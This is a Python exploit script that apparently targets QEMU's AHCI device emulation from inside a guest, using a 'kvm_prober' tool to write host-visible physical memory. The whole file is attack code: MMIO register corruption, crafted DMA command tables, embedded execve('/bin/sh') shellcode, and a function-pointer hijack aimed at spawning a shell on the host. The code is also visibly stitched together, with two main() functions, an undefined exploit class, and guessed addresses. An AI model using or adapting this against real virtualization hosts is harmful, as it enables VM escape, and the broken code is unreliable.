#!/usr/bin/env python3
"""
AHCI Uninitialized Free Exploit - KVM_PROBER VERSION
Uses kvm_prober for physical memory access instead of /dev/mem
"""

import struct
import mmap
import os
import sys
import time
import subprocess
import re
from pathlib import Path
from typing import Optional, List, Tuple, Dict
import ctypes

# ============================================================================
# CONFIGURATION
# ============================================================================

GUEST_MEM_SIZE = 0x10000000
FAKE_CHUNK_SIZE = 0x290
SPRAY_COUNT = 1000
RETRY_COUNT = 3
TIMEOUT_SEC = 2

# ============================================================================
# UTILITIES
# ============================================================================

def log_info(msg): print(f"[\033[94m*\033[0m] {msg}")
def log_success(msg): print(f"[\033[92m+\033[0m] {msg}")
def log_error(msg): print(f"[\033[91m-\033[0m] {msg}")
def log_warning(msg): print(f"[\033[93m!\033[0m] {msg}")
def log_debug(msg):
    if DEBUG:
        print(f"[\033[90mD\033[0m] {msg}")

DEBUG = False

# ============================================================================
# PHYSICAL MEMORY ACCESS VIA KVM_PROBER
# ============================================================================

class KVMProberMemory:
    """Physical memory access via kvm_prober tool"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.kvm_prober = kvm_prober_path
        self.is_available = self.check_kvm_prober()
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug

    def check_kvm_prober(self) -> bool:
        """Check if kvm_prober exists and works"""
        log_info("Checking kvm_prober...")

        if not os.path.exists(self.kvm_prober):
            log_error(f"kvm_prober not found at {self.kvm_prober}")
            log_info("Please make sure kvm_prober is in current directory or specify path")
            return False

        # Test read
        try:
            result = subprocess.run([self.kvm_prober, 'read_phys', '0x1000', '16'],
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and 'Driver initialized' in result.stdout:
                log_success("kvm_prober is working!")
                return True
            else:
                log_error(f"kvm_prober test failed: {result.stderr}")
                return False
        except Exception as e:
            log_error(f"kvm_prober test exception: {e}")
            return False

    def read(self, phys_addr: int, size: int) -> Optional[bytes]:
        """Read physical memory using kvm_prober"""
        if not self.is_available:
            return None

        try:
            cmd = [self.kvm_prober, 'read_phys', f'0x{phys_addr:x}', str(size)]
            if self.debug:
                log_debug(f"Read command: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_SEC)

            if result.returncode != 0:
                if self.debug:
                    log_error(f"kvm_prober read failed: {result.stderr}")
                return None

            # Parse output
            data = self.parse_kvm_prober_output(result.stdout)
            if self.debug and data:
                log_debug(f"Read {len(data)} bytes from 0x{phys_addr:x}: {data.hex()[:32]}...")
            
            return data[:size] if data else None

        except Exception as e:
            if self.debug:
                log_error(f"kvm_prober read exception: {e}")
            return None

    def parse_kvm_prober_output(self, output: str) -> Optional[bytes]:
        """Parse kvm_prober's hex dump output"""
        lines = output.strip().split('\n')
        if not lines:
            return None

        data_bytes = bytearray()

        for line in lines:
            # Skip the "Driver initialized" line and empty lines
            if 'Driver initialized' in line or not line.strip():
                continue
            
            if ':' in line:
                hex_part = line.split(':', 1)[1].strip()
                # Take only the hex part (before the '|' if present)
                if '|' in hex_part:
                    hex_part = hex_part.split('|')[0].strip()
                
                hex_bytes = hex_part.split()
                for hex_byte in hex_bytes:
                    if hex_byte and len(hex_byte) == 2:
                        try:
                            data_bytes.append(int(hex_byte, 16))
                        except ValueError:
                            continue

        return bytes(data_bytes) if data_bytes else None

    def write(self, phys_addr: int, data: bytes) -> bool:
        """Write physical memory using kvm_prober"""
        if not self.is_available:
            log_error("kvm_prober not available")
            return False

        try:
            # Convert to hex string WITHOUT 0x prefix
            hex_data = data.hex()
            
            # Ensure even number of hex characters
            if len(hex_data) % 2 != 0:
                hex_data = '0' + hex_data
            
            cmd = [self.kvm_prober, 'write_phys', f'0x{phys_addr:x}', hex_data]
            
            if self.debug:
                log_debug(f"Write command: {' '.join(cmd)}")
                log_debug(f"Writing {len(data)} bytes to 0x{phys_addr:x}")
                log_debug(f"Hex data: {hex_data[:64]}...")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=TIMEOUT_SEC)

            if result.returncode != 0:
                if self.debug:
                    log_error(f"kvm_prober write failed: {result.stderr}")
                return False
            
            output = result.stdout.strip()
            if self.debug:
                log_debug(f"Write output: {output}")
            
            # Return True if it seems successful
            return 'Wrote' in output or 'success' in output.lower()

        except Exception as e:
            if self.debug:
                log_error(f"kvm_prober write exception: {e}")
            return False

    def test_write_read(self, phys_addr: int) -> bool:
        """Test write and read at a specific address"""
        log_info(f"Testing kvm_prober write/read at 0x{phys_addr:x}")
        
        # Test pattern
        test_data = b'\x41\x42\x43\x44\x45\x46\x47\x48'  # ABCDEFGH
        
        # Write test data
        log_info(f"Writing test pattern: {test_data.hex()}")
        if not self.write(phys_addr, test_data):
            log_error("Write test failed!")
            return False
        
        # Small delay
        time.sleep(0.1)
        
        # Read back
        read_back = self.read(phys_addr, 8)
        if read_back == test_data:
            log_success(f"Write/read test PASSED at 0x{phys_addr:x}")
            log_success(f"Read back: {read_back.hex()}")
            return True
        else:
            log_error(f"Write/read test FAILED at 0x{phys_addr:x}")
            if read_back:
                log_error(f"Expected: {test_data.hex()}")
                log_error(f"Got: {read_back.hex()}")
            else:
                log_error("Could not read back data")
            return False

    def read_qword(self, phys_addr: int) -> Optional[int]:
        """Read 8-byte QWORD"""
        data = self.read(phys_addr, 8)
        if data and len(data) == 8:
            return struct.unpack('<Q', data)[0]
        return None

    def write_qword(self, phys_addr: int, value: int) -> bool:
        """Write 8-byte QWORD"""
        return self.write(phys_addr, struct.pack('<Q', value))

class AHCIDevice:
    """AHCI device interface using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.pci_addr = None
        self.mmio_base = None
        self.mmio_size = 0x10000
        self.phys_mem = KVMProberMemory(kvm_prober_path)

    def set_debug(self, debug: bool):
        self.phys_mem.set_debug(debug)

    def find_device(self) -> bool:
        """Auto-detect QEMU AHCI device"""
        log_info("Searching for QEMU AHCI device...")

        try:
            for dev in Path("/sys/bus/pci/devices").iterdir():
                # Check vendor
                vendor_file = dev / "vendor"
                if vendor_file.exists():
                    vendor = vendor_file.read_text().strip()
                    # Check class - 0x0106 = SATA controller
                    class_file = dev / "class"
                    if class_file.exists():
                        dev_class = class_file.read_text().strip()
                        if dev_class.startswith("0x0106"):
                            self.pci_addr = dev.name
                            log_success(f"Found AHCI at {self.pci_addr} (vendor: {vendor})")
                            return True
        except Exception as e:
            log_error(f"Error searching for AHCI: {e}")

        log_error("No AHCI device found")
        return False

    def get_mmio_address(self) -> Optional[int]:
        """Get MMIO base from PCI config"""
        if not self.pci_addr:
            return None

        resource_file = Path(f"/sys/bus/pci/devices/{self.pci_addr}/resource")

        if not resource_file.exists():
            return None

        try:
            resources = resource_file.read_text().strip().split('\n')
            for i, line in enumerate(resources):
                parts = line.split()
                if len(parts) >= 3:
                    start = int(parts[0], 16)
                    end = int(parts[1], 16)
                    flags = int(parts[2], 16)

                    # Usually resource 5 is the MMIO region for AHCI
                    if i == 5 and start != 0 and end > start:
                        self.mmio_base = start
                        self.mmio_size = end - start + 1
                        log_success(f"AHCI MMIO: 0x{start:x} (size: 0x{self.mmio_size:x})")
                        return start
        except Exception as e:
            log_error(f"Failed to get MMIO address: {e}")

        return None

    def map_mmio(self) -> bool:
        """Verify we can access MMIO region"""
        if not self.mmio_base:
            if not self.get_mmio_address():
                log_error("Cannot get MMIO address")
                return False

        if not self.phys_mem.is_available:
            log_error("kvm_prober not available")
            return False

        # Test read from MMIO region
        log_info(f"Testing MMIO access at 0x{self.mmio_base:x}...")
        test_data = self.phys_mem.read(self.mmio_base, 16)

        if test_data:
            log_success(f"MMIO accessible via kvm_prober")
            return True
        else:
            log_error(f"Failed to read MMIO at 0x{self.mmio_base:x}")
            return False

    def read_reg(self, offset: int) -> int:
        """Read MMIO register"""
        if not self.mmio_base:
            return 0

        addr = self.mmio_base + offset
        data = self.phys_mem.read(addr, 4)

        if data and len(data) == 4:
            return struct.unpack('<I', data)[0]
        return 0

    def write_reg(self, offset: int, value: int):
        """Write MMIO register"""
        if not self.mmio_base:
            return

        addr = self.mmio_base + offset
        # Pack as 32-bit little-endian and write
        self.phys_mem.write(addr, struct.pack('<I', value))

    def reset_port(self, port=0):
        port_base = 0x100 + (port * 0x80)
        cmd_reg = self.read_reg(port_base + 0x18)
        if DEBUG:
            log_debug(f"Port {port} command register: 0x{cmd_reg:x}")

        # Clear ST (Start) bit
        self.write_reg(port_base + 0x18, cmd_reg & ~0x1)
        time.sleep(0.01)

        # Clear interrupt status
        self.write_reg(port_base + 0x10, 0xFFFFFFFF)
        if DEBUG:
            log_debug(f"Reset port {port}")

class GuestMemory:
    """Manage guest physical memory using kvm_prober"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.phys_mem = KVMProberMemory(kvm_prober_path)
        self.allocations = []
        self.base_addr = None
        self.debug = False

    def set_debug(self, debug: bool):
        self.debug = debug
        self.phys_mem.set_debug(debug)

    def init(self) -> bool:
        if not self.phys_mem.is_available:
            log_error("kvm_prober not available")
            return False

        # Test memory at the address from your example
        test_addresses = [
            0x13e8000,    # Address from your example (try this first)
            0x1000000,    # 16MB
            0x2000000,    # 32MB
            0x4000000,    # 64MB
        ]

        for addr in test_addresses:
            log_info(f"Testing memory at 0x{addr:x}...")
            
            # Test write/read
            if self.phys_mem.test_write_read(addr):
                self.base_addr = addr
                log_success(f"Memory accessible at 0x{addr:x}")
                return True
            else:
                log_warning(f"Memory test failed at 0x{addr:x}")

        log_error("Cannot access guest physical memory")
        return False

    def alloc(self, size: int) -> Optional[int]:
        if not self.base_addr:
            log_error("No base address set")
            return None

        # Simple allocation strategy
        alignment = 0x1000
        if not self.allocations:
            addr = self.base_addr
        else:
            last_addr, last_size = self.allocations[-1]
            addr = last_addr + last_size
        
        # Align to next page
        addr = ((addr + alignment - 1) // alignment) * alignment
        
        self.allocations.append((addr, size))
        
        if self.debug:
            log_debug(f"Allocated 0x{size:x} bytes at 0x{addr:x}")
        
        return addr

    def read(self, addr: int, size: int) -> Optional[bytes]:
        return self.phys_mem.read(addr, size)

    def write(self, addr: int, data: bytes) -> bool:
        if self.debug:
            log_debug(f"Writing {len(data)} bytes to 0x{addr:x}")
        
        return self.phys_mem.write(addr, data)

    def read_qword(self, addr: int) -> Optional[int]:
        data = self.read(addr, 8)
        if data and len(data) == 8:
            return struct.unpack('<Q', data)[0]
        return None

    def write_qword(self, addr: int, value: int) -> bool:
        if self.debug:
            log_debug(f"Writing QWORD 0x{value:016x} to 0x{addr:x}")
        return self.phys_mem.write_qword(addr, value)

# ============================================================================
# MAIN EXPLOIT CLASS
# ============================================================================

class DirectAHCIExploit:
    """Direct AHCI MMIO exploit using kvm_prober - NO SPRAYING NEEDED"""

    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
        self.kvm_prober = KVMProberMemory(kvm_prober_path)
        self.ahci_base = 0xfea0e000
        self.debug = False
        
    def set_debug(self, debug: bool):
        self.debug = debug
        self.kvm_prober.set_debug(debug)
    
    def setup(self) -> bool:
        log_info("Setting up direct AHCI exploit...")
        
        if not self.kvm_prober.is_available:
            log_error("kvm_prober not available")
            return False
        
        # Test access to AHCI MMIO
        log_info(f"Testing AHCI MMIO access @ 0x{self.ahci_base:x}")
        test_data = self.kvm_prober.read(self.ahci_base, 16)
        
        if test_data:
            log_success(f"AHCI MMIO accessible: {test_data.hex()[:32]}...")
            return True
        else:
            log_error("Cannot access AHCI MMIO")
            return False
    
    def write_mmio(self, offset: int, value: int) -> bool:
        """Write 32-bit value to MMIO register"""
        addr = self.ahci_base + offset
        data = struct.pack('<I', value)
        return self.kvm_prober.write(addr, data)
    
    def read_mmio(self, offset: int) -> Optional[int]:
        """Read 32-bit value from MMIO register"""
        addr = self.ahci_base + offset
        data = self.kvm_prober.read(addr, 4)
        if data and len(data) == 4:
            return struct.unpack('<I', data)[0]
        return None
    
    def corrupt_ahci_state(self):
        """Direct corruption of AHCI state via MMIO"""
        log_info("Direct AHCI state corruption attack")
        
        # AHCI Register Map (offsets from base):
        # 0x00-0x2F: Global Host Control
        # 0x100-0x17F: Port 0 Registers
        # 0x180-0x1FF: Port 1 Registers, etc.
        
        # Critical registers to corrupt:
        
        # 1. Command List Base Address (CLB) - Port 0
        # Make it point to controlled memory
        controlled_addr = 0x1337000  # Address we can write to
        log_info(f"Setting CLB to controlled address 0x{controlled_addr:x}")
        self.write_mmio(0x100, controlled_addr & 0xFFFFFFFF)      # CLB low
        self.write_mmio(0x104, (controlled_addr >> 32) & 0xFFFFFFFF)  # CLB high
        
        # 2. FIS Base Address (FB) - Port 0
        # Also point to controlled memory
        fis_addr = 0x1338000
        log_info(f"Setting FIS base to 0x{fis_addr:x}")
        self.write_mmio(0x108, fis_addr & 0xFFFFFFFF)      # FB low
        self.write_mmio(0x10C, (fis_addr >> 32) & 0xFFFFFFFF)  # FB high
        
        # 3. Command Register - enable weird states
        log_info("Corrupting Command Register")
        # Bits: ST=1 (start), FRE=1, others corrupted
        corrupted_cmd = 0xFFFFFFFF  # All bits set
        self.write_mmio(0x118, corrupted_cmd)
        
        # 4. Interrupt Status - trigger all interrupts
        log_info("Triggering all interrupts")
        self.write_mmio(0x110, 0xFFFFFFFF)
        
        # 5. SATA Status - corrupt device state
        log_info("Corrupting SATA Status")
        self.write_mmio(0x128, 0xDEADBEEF)
        
        # 6. Command Issue - trigger command with corrupted state
        log_info("Issuing corrupted command")
        self.write_mmio(0x138, 0x1)
        
        log_success("AHCI state corrupted!")
    
    def setup_malicious_dma(self):
        """Set up malicious DMA operation"""
        log_info("Setting up malicious DMA operation")
        
        # Allocate DMA buffer in guest memory
        dma_size = 0x1000
        dma_buffer = self.allocate_dma_buffer(dma_size)
        if not dma_buffer:
            log_error("Failed to allocate DMA buffer")
            return False
        
        # Craft malicious data that QEMU will interpret
        malicious_data = self.create_malicious_dma_data(dma_size)
        self.kvm_prober.write(dma_buffer, malicious_data)
        
        # Set up Command Header in controlled memory
        cmd_header_addr = dma_buffer + 0x800
        self.setup_command_header(cmd_header_addr, dma_buffer, dma_size)
        
        # Point CLB to our command header
        self.write_mmio(0x100, cmd_header_addr & 0xFFFFFFFF)
        self.write_mmio(0x104, (cmd_header_addr >> 32) & 0xFFFFFFFF)
        
        # Enable port and trigger
        self.write_mmio(0x118, 0x11)  # ST=1, FRE=1
        self.write_mmio(0x138, 0x1)   # Command Issue
        
        log_success("Malicious DMA setup complete")
        return True
    
    def allocate_dma_buffer(self, size: int) -> Optional[int]:
        """Allocate DMA buffer in guest physical memory"""
        # Try common guest physical addresses
        test_addresses = [
            0x13e8000,    # Your working area
            0x2000000,    # 32MB
            0x4000000,    # 64MB
            0x10000000,   # 256MB
        ]
        
        for addr in test_addresses:
            # Test write/read
            test_data = b'TESTDATA'
            if self.kvm_prober.write(addr, test_data):
                read_back = self.kvm_prober.read(addr, len(test_data))
                if read_back == test_data:
                    log_success(f"DMA buffer at 0x{addr:x}")
                    return addr
        
        log_error("Cannot find suitable DMA buffer location")
        return None
    
    def create_malicious_dma_data(self, size: int) -> bytes:
        """Create data that will corrupt QEMU when processed as disk I/O"""
        data = bytearray(size)
        
        # Option 1: Fake partition table to trigger bugs in QEMU's block layer
        # MBR with corrupted partition entries
        data[0x1BE:0x1FE] = b'\x80' * 0x40  # All partitions active
        
        # Option 2: Corrupted filesystem metadata
        # Ext4 superblock at offset 0x400
        ext4_magic = b'\x53\xef'  # ext4 magic
        data[0x400:0x402] = ext4_magic
        
        # Option 3: Direct code injection attempt
        # Try to place shellcode that QEMU might execute
        shellcode = self.create_qemu_shellcode()
        if len(shellcode) < 0x100:
            data[0:len(shellcode)] = shellcode
        
        # Option 4: Pointer overwrite patterns
        # Fill with plausible QEMU addresses
        for i in range(0x200, size, 8):
            # Common QEMU .text addresses
            qemu_text = 0x555555554000
            struct.pack_into('<Q', data, i, qemu_text + (i % 0x1000))
        
        return bytes(data)
    
    def create_qemu_shellcode(self) -> bytes:
        """Create shellcode for QEMU process (x86-64 Linux)"""
        # execve("/bin/sh", NULL, NULL)
        shellcode = (
            # xor rdx, rdx
            b'\x48\x31\xd2'
            # mov rbx, "/bin/sh"
            b'\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00'
            # push rbx
            b'\x53'
            # mov rdi, rsp
            b'\x48\x89\xe7'
            # xor rax, rax
            b'\x48\x31\xc0'
            # push rax
            b'\x50'
            # push rdi
            b'\x57'
            # mov rsi, rsp
            b'\x48\x89\xe6'
            # mov al, 0x3b (execve)
            b'\xb0\x3b'
            # syscall
            b'\x0f\x05'
        )
        return shellcode
    
    def setup_command_header(self, header_addr: int, dma_addr: int, dma_size: int):
        """Set up AHCI command header for DMA"""
        # AHCI Command Header (32 bytes)
        header = bytearray(32)
        
        # Command FIS Length: 5 DWORDS (20 bytes)
        struct.pack_into('<H', header, 0, 5)
        
        # ATAPI: 0 (not ATAPI), Write: 0 (read), Prefetch: 0, Reset: 0
        # Physical Region Descriptor Table Length (PRDTL): 1 entry
        struct.pack_into('<H', header, 2, 1)
        
        # PRD Byte Count
        struct.pack_into('<I', header, 4, dma_size)
        
        # Command Table Base Address (CTBA)
        ctba = dma_addr + 0x400  # Command table after header
        struct.pack_into('<Q', header, 8, ctba)
        
        # Write header
        self.kvm_prober.write(header_addr, header)
        
        # Setup Command Table (128 bytes)
        cmd_table = bytearray(128)
        
        # Command FIS (20 bytes)
        # H2D FIS, Command = 0x25 (READ DMA EXT)
        cmd_fis = bytearray(20)
        cmd_fis[0] = 0x27  # FIS Type: Host to Device
        cmd_fis[1] = 0x80  # Command bit
        cmd_fis[2] = 0x25  # READ DMA EXT command
        
        # LBA (logical block address) - any value
        cmd_fis[4] = 0x01
        cmd_fis[5] = 0x00
        cmd_fis[6] = 0x00
        cmd_fis[7] = 0x00
        cmd_fis[8] = 0x00
        cmd_fis[9] = 0x00
        
        # Sector count
        cmd_fis[12] = 0x01  # 1 sector
        
        cmd_table[0:20] = cmd_fis
        
        # PRD (Physical Region Descriptor) - 16 bytes
        # Data Base Address
        struct.pack_into('<Q', cmd_table, 0x80, dma_addr)
        # Byte Count (with interrupt flag)
        struct.pack_into('<I', cmd_table, 0x88, dma_size | (1 << 31))
        
        # Write command table
        self.kvm_prober.write(ctba, cmd_table)
    
    def find_qemu_structures(self):
        """Scan memory around AHCI for QEMU data structures"""
        log_info(f"Scanning for QEMU structures around 0x{self.ahci_base:x}")
        
        scan_start = self.ahci_base - 0x10000
        scan_end = self.ahci_base + 0x10000
        
        found = []
        
        for addr in range(scan_start, scan_end, 8):
            data = self.kvm_prober.read(addr, 8)
            if not data:
                continue
            
            val = struct.unpack('<Q', data)[0]
            
            # Look for QEMU code pointers
            if 0x550000000000 <= val < 0x570000000000:
                # Could be a vtable or function pointer
                # Check nearby for more pointers (vtables have multiple)
                context = self.kvm_prober.read(addr - 0x20, 0x40)
                if context:
                    # Count function pointers in context
                    ptr_count = 0
                    for i in range(0, len(context), 8):
                        if i + 8 <= len(context):
                            ctx_val = struct.unpack('<Q', context[i:i+8])[0]
                            if 0x550000000000 <= ctx_val < 0x570000000000:
                                ptr_count += 1
                    
                    if ptr_count >= 2:  # Likely vtable
                        log_success(f"Possible QEMU vtable @ 0x{addr:x} (context has {ptr_count} ptrs)")
                        found.append(addr)
        
        return found
    
    def attempt_control_hijack(self):
        """Attempt to hijack control flow by overwriting QEMU function pointers"""
        log_info("Attempting control flow hijack")
        
        # Find QEMU structures
        targets = self.find_qemu_structures()
        if not targets:
            log_error("No QEMU structures found")
            return False
        
        # Try to overwrite first found pointer
        target_addr = targets[0]
        
        # Read current value
        current = self.kvm_prober.read(target_addr, 8)
        if current:
            current_val = struct.unpack('<Q', current)[0]
            log_info(f"Current value at 0x{target_addr:x}: 0x{current_val:016x}")
        
        # Try to find QEMU's system() or similar
        # Scan QEMU memory for useful functions
        qemu_system_addr = self.find_qemu_system()
        if qemu_system_addr:
            log_success(f"Found potential system @ 0x{qemu_system_addr:016x}")
            
            # Overwrite pointer
            if self.kvm_prober.write_qword(target_addr, qemu_system_addr):
                log_success(f"Overwritten pointer at 0x{target_addr:x}")
                
                # Now trigger the function
                return self.trigger_corrupted_function()
        
        return False
    
    def find_qemu_system(self) -> Optional[int]:
        """Try to find system() or similar in QEMU memory"""
        # QEMU might use libc's system() via dlsym
        # Or have its own command execution
        
        # Try common offsets from QEMU base
        qemu_base = 0x555555554000  # Common QEMU base
        
        # These are guesses - you'd need to analyze QEMU binary
        possible_offsets = [
            0x10000, 0x20000, 0x30000, 0x40000,
            0x50000, 0x60000, 0x70000, 0x80000,
        ]
        
        for offset in possible_offsets:
            addr = qemu_base + offset
            # Read a few bytes to see if it looks like code
            data = self.kvm_prober.read(addr, 16)
            if data and b'\x55\x48\x89\xe5' in data:  # push rbp; mov rbp, rsp
                log_info(f"Found code at 0x{addr:x}")
                return addr
        
        return None
    
    def trigger_corrupted_function(self) -> bool:
        """Trigger the corrupted function pointer"""
        log_info("Triggering corrupted function...")
        
        # Try various ways to trigger:
        
        # 1. Trigger AHCI interrupt
        self.write_mmio(0x110, 0xFFFFFFFF)  # Set all interrupt bits
        time.sleep(0.1)
        
        # 2. Issue command
        self.write_mmio(0x138, 0x1)
        time.sleep(0.1)
        
        # 3. Reset port (might trigger cleanup functions)
        cmd = self.read_mmio(0x118)
        if cmd:
            self.write_mmio(0x118, cmd & ~0x1)  # Clear ST bit
            time.sleep(0.1)
            self.write_mmio(0x118, cmd | 0x1)   # Set ST bit
        
        log_success("Trigger attempted")
        return True
    
    def run_simple_test(self):
        """Run simple test - corrupt registers and see what happens"""
        log_info("Running simple corruption test")
        
        # Save original values
        original = {}
        for offset in [0x100, 0x104, 0x108, 0x10C, 0x110, 0x118, 0x128, 0x138]:
            val = self.read_mmio(offset)
            if val is not None:
                original[offset] = val
        
        # Corrupt
        self.corrupt_ahci_state()
        
        # Wait and observe
        log_info("Waiting 3 seconds to observe effects...")
        time.sleep(3)
        
        # Restore (optional)
        log_info("Restoring original values...")
        for offset, val in original.items():
            self.write_mmio(offset, val)
        
        log_info("Test complete - check for QEMU crashes or unexpected behavior")
    
    def run_exploit(self) -> bool:
        """Main exploit execution"""
        log_info("=" * 60)
        log_info("DIRECT AHCI MMIO EXPLOIT")
        log_info("=" * 60)
        
        if not self.setup():
            return False
        
        # Try different approaches
        log_info("\n[1] Simple corruption test")
        self.run_simple_test()
        
        log_info("\n[2] Malicious DMA setup")
        self.setup_malicious_dma()
        
        log_info("\n[3] Control hijack attempt")
        self.attempt_control_hijack()
        
        log_success("Exploit sequence completed!")
        log_info("Check for:")
        log_info("  - QEMU process crash/strange behavior")
        log_info("  - Shell spawned from QEMU process")
        log_info("  - Files created on host")
        
        return True

# Update main() to use this
def main():
    args = parse_args()
    
    log_info("DIRECT AHCI MMIO Exploit")
    log_info(f"Target: AHCI MMIO @ 0xfea0e000")
    
    exploit = DirectAHCIExploit(args.kvm_prober)
    if args.debug:
        exploit.set_debug(True)
    
    try:
        success = exploit.run_exploit()
        if success:
            log_success("Exploit completed")
        else:
            log_error("Exploit failed")
    except Exception as e:
        log_error(f"Error: {e}")
        import traceback
        traceback.print_exc()

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def parse_args():
    import argparse
    parser = argparse.ArgumentParser(description='AHCI Uninitialized Free Exploit (kvm_prober version)')
    parser.add_argument('--kvm-prober', default='/root/kvm_probin/prober/kvm_prober',
                       help='Path to kvm_prober binary')
    parser.add_argument('--test-trigger', action='store_true',
                       help='Test only the vulnerability trigger')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug output')
    parser.add_argument('--chunk-size', type=lambda x: int(x, 0), default=FAKE_CHUNK_SIZE,
                       help=f'Fake chunk size (default: 0x{FAKE_CHUNK_SIZE:x})')
    parser.add_argument('--spray-count', type=int, default=SPRAY_COUNT,
                       help=f'Spray count (default: {SPRAY_COUNT})')
    parser.add_argument('--retry-count', type=int, default=RETRY_COUNT,
                       help=f'Retry count (default: {RETRY_COUNT})')
    return parser.parse_args()

def main():
    global DEBUG
    
    args = parse_args()
    DEBUG = args.debug
    
    log_info("AHCI Uninitialized Free Exploit - kvm_prober Version")
    log_info("Target: QEMU AHCI Device (hw/ide/ahci.c:1007) - CVE-2021-3947")
    log_info("Memory access via: kvm_prober")
    log_info(f"kvm_prober path: {args.kvm_prober}")
    log_info("=" * 60)
    
    # Check if we can run kvm_prober
    if not os.path.exists(args.kvm_prober):
        log_error(f"kvm_prober not found at {args.kvm_prober}")
        sys.exit(1)
    
    if not os.access(args.kvm_prober, os.X_OK):
        log_error(f"kvm_prober is not executable")
        sys.exit(1)
    
    exploit = AHCIExploit(kvm_prober_path=args.kvm_prober,
                         chunk_size=args.chunk_size,
                         spray_count=args.spray_count,
                         retry_count=args.retry_count)
    
    if args.debug:
        exploit.set_debug(True)
    
    try:
        if args.test_trigger:
            success = exploit.test_trigger_only()
            if success:
                log_success("Vulnerability trigger test successful!")
            else:
                log_error("Vulnerability trigger test failed")
        else:
            success = exploit.run_exploit()
            if success:
                log_success("Exploit appears to have succeeded!")
            else:
                log_error("Exploit failed")
                sys.exit(1)
            
    except KeyboardInterrupt:
        log_info("\nInterrupted by user")
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        log_info("Cleanup completed")

if __name__ == "__main__":
    main()